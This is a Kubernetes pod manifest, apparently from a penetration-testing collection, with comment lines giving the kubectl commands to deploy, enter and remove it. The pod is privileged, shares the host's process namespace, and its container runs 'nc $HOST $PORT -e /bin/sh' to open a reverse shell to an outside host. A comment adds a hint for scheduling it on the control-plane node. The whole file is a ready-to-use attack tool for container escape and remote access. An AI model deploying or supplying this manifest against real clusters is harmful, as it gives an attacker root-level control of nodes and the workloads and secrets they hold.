###########################################################
## Deploy: kubectl -n [namespace] apply -f pod-priv-and-hostpid-revshell.yaml 
## Access: kubectl -n [namespace] exec -it pod-priv-and-hostpid-revshell -- bash
## Remove: kubectl -n [namespace] delete pod-priv-and-hostpid-revshell
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-priv-and-hostpid-revshell
  labels: 
    app: pentest
spec:
  hostPID: true
  containers:
  - name: priv-and-hostpid-revshell
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]

    securityContext:
      privileged: true
    #nodeName: control-plane-node-name # Uncomment and change to control node name to try and schedule pod on control-plane node
  restartPolicy: Always